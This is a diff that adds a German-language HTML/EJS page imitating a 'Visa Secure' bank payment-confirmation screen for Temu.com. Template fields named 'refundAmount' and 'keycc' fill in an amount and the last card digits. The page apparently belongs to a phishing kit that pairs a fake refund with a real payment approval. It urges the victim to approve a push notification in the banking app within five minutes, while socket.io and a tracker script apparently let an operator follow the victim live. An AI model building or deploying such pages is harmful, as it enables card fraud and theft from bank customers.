@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sicherheitscheck</title>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+
+        .auth-card {
+            background: #fff;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #e0e0e0;
+        }
+
+        .auth-header {
+            background-color: #fff;
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .bank-logo {
+            font-weight: bold;
+            font-size: 18px;
+            color: #f28d00;
+            /* Generic Bank Blue */
+            display: flex;
+            align-items: center;
+        }
+
+        .bank-shield {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            fill: #f28d00;
+        }
+
+        .auth-body {
+            padding: 25px;
+        }
+
+        h1 {
+            font-size: 18px;
+            margin: 0 0 20px 0;
+            text-align: center;
+            color: #333;
+        }
+
+        .transaction-details {
+            width: 100%;
+            margin-bottom: 25px;
+            font-size: 14px;
+            border-collapse: collapse;
+        }
+
+        .transaction-details td {
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .transaction-details td:first-child {
+            color: #777;
+            width: 40%;
+        }
+
+        .transaction-details td:last-child {
+            font-weight: 600;
+            text-align: right;
+            color: #333;
+        }
+
+        .interaction-area {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        /* Animated Phone Icon */
+        .phone-verification {
+            position: relative;
+            width: 60px;
+            height: 100px;
+            margin: 0 auto 20px auto;
+        }
+
+        .phone-body {
+            width: 100%;
+            height: 100%;
+            border: 3px solid #333;
+            border-radius: 10px;
+            box-sizing: border-box;
+            background: #fff;
+            position: relative;
+        }
+
+        .phone-screen {
+            background: #f0f0f0;
+            margin: 5px;
+            height: 75%;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Animation Elements */
+        .auth-notification {
+            position: absolute;
+            top: 20%;
+            left: 10%;
+            right: 10%;
+            height: 20px;
+            background: #ffcc00;
+            border-radius: 4px;
+            opacity: 0;
+            transform: translateY(-20px);
+            animation: note-anim 6s infinite;
+        }
+
+        .app-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            opacity: 0;
+            padding: 10px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: app-anim 6s infinite;
+        }
+
+        .app-nav {
+            width: 100%;
+            height: 8px;
+            background: #eee;
+            margin-bottom: 10px;
+            border-radius: 2px;
+        }
+
+        .app-content-line {
+            width: 80%;
+            height: 4px;
+            background: #eee;
+            margin-bottom: 6px;
+            border-radius: 2px;
+        }
+
+        .app-content-line.short {
+            width: 50%;
+        }
+
+        .app-btn {
+            width: 60%;
+            height: 12px;
+            background: #2162a1;
+            /* User's preferred blue */
+            margin-top: auto;
+            margin-bottom: 10px;
+            border-radius: 3px;
+            transition: transform 0.1s;
+            animation: btn-anim 6s infinite;
+        }
+
+        .auth-success {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #4caf50;
+            /* Green */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            animation: success-anim 6s infinite;
+        }
+
+        .checkmark {
+            width: 16px;
+            height: 8px;
+            border-left: 3px solid #fff;
+            border-bottom: 3px solid #fff;
+            transform: rotate(-45deg);
+            margin-bottom: 4px;
+        }
+
+        .hand-cursor {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 50%;
+            border: 2px solid rgba(255, 255, 255, 0.8);
+            transform: translate(-50%, -50%);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 10;
+            animation: hand-anim 6s infinite;
+        }
+
+        /* Keyframes */
+
+        /* 0-1s: Idle
+               1-2s: Note Enter
+               2-3s: Click Note
+               3-4s: App Show
+               4-5s: Click Button
+               5-6s: Success
+            */
+
+        @keyframes note-anim {
+
+            0%,
+            10% {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+
+            15%,
+            30% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+
+            /* Show Note */
+            35%,
+            100% {
+                opacity: 0;
+                transform: translateY(0);
+            }
+
+            /* Hide when clicked */
+        }
+
+        @keyframes app-anim {
+
+            0%,
+            30% {
+                opacity: 0;
+            }
+
+            35%,
+            65% {
+                opacity: 1;
+            }
+
+            /* Show App */
+            70%,
+            100% {
+                opacity: 0;
+            }
+        }
+
+        @keyframes btn-anim {
+
+            0%,
+            55% {
+                transform: scale(1);
+                background: #2162a1;
+            }
+
+            58% {
+                transform: scale(0.9);
+                background: #1a4f85;
+            }
+
+            /* Click */
+            62%,
+            100% {
+                transform: scale(1);
+                background: #2162a1;
+            }
+        }
+
+        @keyframes success-anim {
+
+            0%,
+            65% {
+                opacity: 0;
+            }
+
+            70%,
+            90% {
+                opacity: 1;
+            }
+
+            /* Show Success */
+            100% {
+                opacity: 0;
+            }
+        }
+
+        @keyframes hand-anim {
+
+            /* Start hidden */
+            0%,
+            15% {
+                opacity: 0;
+                top: 110%;
+                left: 50%;
+            }
+
+            /* Move to Note */
+            20% {
+                opacity: 1;
+                top: 30%;
+                left: 50%;
+                transform: translate(-50%, -50%) scale(1);
+            }
+
+            /* Click Note */
+            25% {
+                transform: translate(-50%, -50%) scale(0.8);
+                background: rgba(0, 0, 0, 0.4);
+            }
+
+            30% {
+                transform: translate(-50%, -50%) scale(1);
+                background: rgba(0, 0, 0, 0.2);
+                opacity: 1;
+            }
+
+            /* Move to App Button */
+            35% {
+                top: 30%;
+                left: 50%;
+                opacity: 0;
+            }
+
+            /* Hide during transition */
+            40% {
+                top: 75%;
+                left: 50%;
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+
+            /* Click Button */
+            55% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+
+            58% {
+                transform: translate(-50%, -50%) scale(0.8);
+                background: rgba(0, 0, 0, 0.4);
+            }
+
+            62% {
+                transform: translate(-50%, -50%) scale(1);
+                background: rgba(0, 0, 0, 0.2);
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 0;
+            }
+        }
+
+        .instruction-primary {
+            font-size: 16px;
+            font-weight: bold;
+            color: #fb7701;
+            margin-bottom: 10px;
+        }
+
+        .instruction-secondary {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .steps {
+            text-align: left;
+            font-size: 13px;
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+
+        .steps ol {
+            margin: 0;
+            padding-left: 20px;
+        }
+
+        .steps li {
+            margin-bottom: 8px;
+            color: #444;
+        }
+
+        .timer-bar {
+            height: 10px;
+            background: #eee;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .timer-progress {
+            height: 100%;
+            background: #4dc928;
+            width: 100%;
+            animation: countdown 300s linear forwards;
+        }
+
+        @keyframes countdown {
+            from {
+                width: 100%;
+            }
+
+            to {
+                width: 0%;
+            }
+        }
+
+        .timer-text {
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+        }
+
+        .auth-footer {
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+
+        .auth-footer a {
+            color: #2162a1;
+            text-decoration: none;
+        }
+
+        .auth-footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="auth-card">
+        <div class="auth-header">
+            <div class="bank-logo">
+                <svg style="width: 32px; height: 40px; margin-right: 10px;" viewBox="0 0 32 40" fill="none"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <g clip-path="url(#clip0_1041_97)">
+                        <path
+                            d="M29.7981 12.1882C30.3491 12.1882 30.4311 11.9283 29.9821 11.6123L16.8171 2.33225C16.3681 2.01425 15.6311 2.01425 15.1821 2.33225L2.01805 11.6112C1.56805 11.9272 1.65005 12.1873 2.20005 12.1873L29.7981 12.1882ZM16.0001 5.72725C17.0961 5.72725 17.9841 6.61625 17.9841 7.71125C17.9841 8.80925 17.0951 9.69525 16.0001 9.69525C14.9021 9.69525 14.0141 8.80825 14.0141 7.71125C14.0141 6.61525 14.9031 5.72725 16.0001 5.72725Z"
+                            fill="#fb7701" />
+                        <path d="M8.29604 13.6885H4.41504V26.0925H8.29604V13.6885Z" fill="#fb7701" />
+                        <path d="M17.9401 13.6885H14.0591V26.0925H17.9401V13.6885Z" fill="#fb7701" />
+                        <path d="M27.5841 13.6885H23.7041V26.0925H27.5841V13.6885Z" fill="#fb7701" />
+                        <path
+                            d="M29.5408 27.5918H2.45876C2.15176 27.5918 1.90576 27.8398 1.90576 28.1448V29.3538C1.90576 29.6608 2.15276 29.9068 2.45876 29.9068H29.5398C29.8448 29.9068 30.0928 29.6608 30.0928 29.3538V28.1448C30.0928 27.8398 29.8448 27.5918 29.5408 27.5918Z"
+                            fill="#fb7701" />
+                    </g>
+                    <defs>
+                        <clipPath id="clip0_1041_97">
+                            <rect width="32" height="40" fill="white" />
+                        </clipPath>
+                    </defs>
+                </svg>
+
+                Sicherheitscheck
+            </div>
+            <div style="font-size: 12px; color: #999;">Visa Secure</div>
+        </div>
+
+        <div class="auth-body">
+            <h1>Zahlungsbestätigung</h1>
+
+            <table class="transaction-details">
+                <tr>
+                    <td>Händler</td>
+                    <td>Temu.com</td>
+                </tr>
+                <tr>
+                    <td>Betrag</td>
+                    <td>
+                        <%= refundAmount %> €
+                    </td>
+                </tr>
+                <tr>
+                    <td>Datum</td>
+                    <td id="today-date"></td>
+                </tr>
+                <tr>
+                    <td>Karte</td>
+                    <td>**** **** **** <%= keycc %>
+                    </td>
+                </tr>
+            </table>
+
+            <div class="interaction-area">
+                <div class="phone-verification">
+                    <div class="phone-body">
+                        <div class="phone-screen">
+                            <!-- Layer 1: Notification -->
+                            <div class="auth-notification"></div>
+
+                            <!-- Layer 2: App Screen -->
+                            <div class="app-screen">
+                                <div class="app-nav"></div>
+                                <div class="app-content-line"></div>
+                                <div class="app-content-line short"></div>
+                                <div class="app-btn"></div>
+                            </div>
+
+                            <!-- Layer 3: Success -->
+                            <div class="auth-success">
+                                <div class="checkmark"></div>
+                            </div>
+
+                            <!-- Layer 4: Hand Cursor -->
+                            <div class="hand-cursor"></div>
+                        </div>
+                        <div style="width: 8px; height: 8px; background: #ddd; border-radius: 50%; margin: 5px auto;">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="instruction-primary">Bitte bestätigen Sie in Ihrer App</div>
+
+                <div class="instruction-secondary">
+                    Wir haben eine Benachrichtigung an Ihr verknüpftes Gerät gesendet.
+                </div>
+            </div>
+
+            <div class="steps">
+                <ol>
+                    <li>Öffnen Sie Ihre Banking App.</li>
+                    <li>Bestätigen Sie die Transaktion innerhalb von 5 Minuten.</li>
+                </ol>
+            </div>
+
+            <div class="timer-wrapper">
+                <div class="timer-bar">
+                    <div class="timer-progress"></div>
+                </div>
+                <div class="timer-text">Sitzung läuft ab in <span id="countdown">5:00</span></div>
+            </div>
+
+            <div class="auth-footer">
+                <a href="#">Abbrechen</a>
+                <a href="#">Hilfe</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/tracker.js"></script>
+    <script>
+        // Set today's date
+        const date = new Date();
+        const formattedDate = date.toLocaleDateString('de-DE');
+        document.getElementById('today-date').textContent = formattedDate;
+
+        // Countdown Logic
+        function startCountdown() {
+            let duration = 5 * 60; // 5 minutes
+            const timerElement = document.getElementById('countdown');
+
+            const timer = setInterval(function () {
+                const minutes = Math.floor(duration / 60);
+                let seconds = duration % 60;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                timerElement.textContent = minutes + ":" + seconds;
+
+                duration--;
+
+                if (duration < 0) {
+                    clearInterval(timer);
+                    timerElement.textContent = "Abgelaufen";
+                }
+            }, 1000);
+        }
+
+        document.addEventListener('DOMContentLoaded', startCountdown);
+    </script>
+</body>
+
+</html>
